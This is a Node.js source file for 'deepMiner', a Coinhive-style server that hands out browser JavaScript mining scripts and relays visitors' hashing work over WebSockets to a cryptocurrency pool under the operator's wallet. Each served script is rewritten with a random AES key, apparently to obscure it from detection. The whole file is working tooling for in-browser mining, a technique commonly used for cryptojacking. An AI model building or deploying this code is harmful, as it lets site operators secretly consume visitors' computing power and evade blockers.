/**
 * deepMiner v1.1
 * Idea from coinhive.com
 * Worker for any pool or personal wallet
 * By evil7@deePwn
 * improved by vphelipe
 */
var http = require('http'),
    https = require('https'),
    WebSocket = require("ws"),
    net = require('net'),
    fs = require('fs'),
    crypto = require("crypto"),
    CryptoJS = require('./crypto-js-3.1.9');

var conf = JSON.parse(fs.readFileSync(__dirname + '/config.json', 'utf8'));

//ssl support
const ssl = !!(conf.key && conf.cert);

//heroku port
conf.lport = process.env.PORT || conf.lport;
conf.domain = process.env.DOMAIN || conf.domain;

// crypto for AES
function rand(n) {
    var chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
    var res = "";
    for (var i = 0; i < n; i++) {
        var id = Math.ceil(Math.random() * 35);
        res += chars[id];
    }
    return res;
}

function enAES(key, str) {
    var encrypt = CryptoJS.AES.encrypt(str, CryptoJS.enc.Utf8.parse(key), {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    });
    return encrypt;
}

function deAES(key, str) {
    var decrypt = CryptoJS.AES.decrypt(str, CryptoJS.enc.Utf8.parse(key), {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    });
    return decrypt;
}

const stats = (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    req.url = (req.url === '/') ? '/index.html' : req.url;
    fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
        if (err) {
            res.writeHead(301, {
                'Location': 'https://' + conf.domain
            });
            res.end(buf);
        } else {
            if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
                if (req.url.match(/\.js$/)) {
                    var randKey = rand(32);
                    buf = buf.replace(/%AES_FILE%/g, buf);
                    buf = buf.replace(/%AES_KEY%/g, randKey);
                    buf = buf.replace(/%CryptoJS_CODE%/g, fs.readFileSync('./crypto-js-3.1.9.min.js', 'utf8'));
                    res.setHeader('content-type', 'application/javascript');
                }
            } else {
                res.setHeader('Content-Type', 'application/octet-stream');
            }
            res.end(buf);
        }
    });
}

//ssl support
if (ssl) {
    var web = https.createServer({
        key: fs.readFileSync(conf.key),
        cert: fs.readFileSync(conf.cert)
    }, stats)
} else {
    var web = http.createServer(stats);
}

// Miner Proxy Srv
var srv = new WebSocket.Server({
    server: web,
    path: "/api",
    maxPayload: 256
});
srv.on('connection', (ws) => {
    var conn = {
        uid: null,
        pid: crypto.randomBytes(12).toString("hex"),
        workerId: null,
        found: 0,
        accepted: 0,
        ws: ws,
        pl: new net.Socket(),
    }
    var pool = conf.pool.split(':');
    conn.pl.connect(pool[1], pool[0]);

    // Trans WebSocket to PoolSocket
    function ws2pool(data) {
        var buf;
        data = JSON.parse(data);
        switch (data.type) {
            case 'auth':
                {
                    conn.uid = data.params.site_key;
                    if (data.params.user) {
                        conn.uid += '@' + data.params.user;
                    }
                    buf = {
                        "method": "login",
                        "params": {
                            "login": conf.addr,
                            "pass": conf.pass,
                            "agent": "deepMiner"
                        },
                        "id": conn.pid
                    }
                    buf = JSON.stringify(buf) + '\n';
                    conn.pl.write(buf);
                    break;
                }
            case 'submit':
                {
                    conn.found++;
                    buf = {
                        "method": "submit",
                        "params": {
                            "id": conn.workerId,
                            "job_id": data.params.job_id,
                            "nonce": data.params.nonce,
                            "result": data.params.result
                        },
                        "id": conn.pid
                    }
                    buf = JSON.stringify(buf) + '\n';
                    conn.pl.write(buf);
                    break;
                }
        }
    }

    // Trans PoolSocket to WebSocket
    function pool2ws(data) {
        try {
            var buf;
            data = JSON.parse(data);
            if (data.id === conn.pid && data.result) {
                if (data.result.id) {
                    conn.workerId = data.result.id;
                    buf = {
                        "type": "authed",
                        "params": {
                            "token": "",
                            "hashes": conn.accepted
                        }
                    }
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                    buf = {
                        "type": "job",
                        "params": data.result.job
                    }
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                } else if (data.result.status === 'OK') {
                    conn.accepted++;
                    buf = {
                        "type": "hash_accepted",
                        "params": {
                            "hashes": conn.accepted
                        }
                    }
                    buf = JSON.stringify(buf);
                    conn.ws.send(buf);
                }
            }
            if (data.id === conn.pid && data.error) {
                if (data.error.code === -1) {
                    buf = {
                        "type": "banned",
                        "params": {
                            "banned": conn.pid
                        }
                    }
                } else {
                    buf = {
                        "type": "error",
                        "params": {
                            "error": data.error.message
                        }
                    }
                }
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            }
            if (data.method === 'job') {
                buf = {
                    "type": 'job',
                    "params": data.params
                }
                buf = JSON.stringify(buf);
                conn.ws.send(buf);
            }
        } catch (error) {
            console.warn('[!] Error: ' + error.message)
        }
    }
    conn.ws.on('message', (data) => {
        ws2pool(data);
        console.log('[>] Request: ' + conn.uid + '\n\n' + data + '\n');
    });
    conn.ws.on('error', (data) => {
        console.log('[!] ' + conn.uid + ' WebSocket ' + data + '\n');
        conn.pl.destroy();
    });
    conn.ws.on('close', () => {
        console.log('[!] ' + conn.uid + ' offline.\n');
        conn.pl.destroy();
    });
    conn.pl.on('data', function (data) {
        var linesdata = data;
        var lines = String(linesdata).split("\n");
        if (lines[1].length > 0) {
            console.log('[<] Response: ' + conn.pid + '\n\n' + lines[0] + '\n');
            console.log('[<] Response: ' + conn.pid + '\n\n' + lines[1] + '\n')
            pool2ws(lines[0]);
            pool2ws(lines[1]);
        } else {
            console.log('[<] Response: ' + conn.pid + '\n\n' + data + '\n');
            pool2ws(data);
        }
    });
    conn.pl.on('error', (data) => {
        console.log('PoolSocket ' + data + '\n');
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
    conn.pl.on('close', () => {
        console.log('PoolSocket Closed.\n');
        if (conn.ws.readyState !== 3) {
            conn.ws.close();
        }
    });
});
web.listen(conf.lport, conf.lhost);